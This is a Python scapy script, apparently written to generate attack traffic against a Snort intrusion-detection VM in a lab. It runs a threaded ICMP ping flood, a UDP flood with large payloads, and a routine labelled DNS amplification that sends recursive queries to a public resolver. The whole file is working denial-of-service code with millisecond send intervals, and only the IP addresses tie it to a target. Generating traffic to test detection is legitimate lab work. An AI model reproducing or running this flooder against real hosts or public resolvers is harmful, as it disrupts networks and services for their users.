import random
import threading
import time
from scapy.all import *

# Global variable to control the attack loop
running = True

# IP addresses to simulate attacks on
target_ip = "192.168.0.29"  # IP of the target (Snort VM)
source_ip = "192.168.0.28"  # Source IP (attacker VM)

att_int = 0.001

syn_ports = [80,443,22,21]
udp_payloads = [1024,2048,4096]

# Define the attack methods

# 1. Ping Flood (ICMP Echo Request)
def ping_flood():
    while running:
        packet = IP(dst=target_ip, src=source_ip) / ICMP()
        send(packet, verbose=0)
        time.sleep(att_int)


# 2. UDP Flood

def udp_flood():
    while running:
        source_port = random.randint(1024, 65535)
        payload_size=random.choice(udp_payloads)
        packet = IP(dst=target_ip, src=source_ip) / UDP(sport=source_port, dport=53) / Raw(load="X" * payload_size)
        send(packet, verbose=0)
        time.sleep(att_int)

# 3. DNS Amplification Attack (Fake DNS request)
def dns_amplification():
    while running:
        dns_query = IP(dst="8.8.8.8", src=source_ip) / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname="example.com"))
        send(dns_query, verbose=0)
        time.sleep(att_int)

# Function to stop the attack threads
def stop_attacks():
    global running
    running = False
    print("\nStopping all attacks...")

# Start attack threads
def start_attacks():
    # Create threads for each attack type
    threads = [
        threading.Thread(target=udp_flood),
        threading.Thread(target=ping_flood),
        threading.Thread(target=dns_amplification)
    ]
    
    for thread in threads:
        thread.daemon = True  # This will ensure threads close when the main program stops
        thread.start()
    
    # Keeps the script running until the user presses stop
    try:
        while True:
            pass
    except KeyboardInterrupt:
        stop_attacks()

if __name__ == "__main__":
    start_attacks()
